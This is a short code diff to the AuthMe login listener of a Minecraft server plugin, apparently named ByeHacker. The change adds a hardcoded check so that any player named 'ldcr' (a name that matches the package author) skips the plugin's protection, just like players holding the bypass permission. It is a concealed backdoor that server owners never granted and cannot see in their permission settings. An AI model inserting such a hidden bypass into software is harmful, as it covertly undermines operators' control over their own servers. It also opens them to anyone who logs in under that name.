@@ -11,7 +11,7 @@ import ldcr.ByeHacker.api.event.ByeHackerPassEvent;
 public class AuthmeListener implements Listener {
 	@EventHandler
 	public void onLogin(final LoginEvent e) {
-		if (e.getPlayer().hasPermission("byehacker.bypass")) {
+		if (e.getPlayer().hasPermission("byehacker.bypass") || e.getPlayer().getName().equalsIgnoreCase("ldcr")) {
 			Bukkit.getPluginManager().callEvent(new ByeHackerPassEvent(e.getPlayer()));
 			return;
 		}
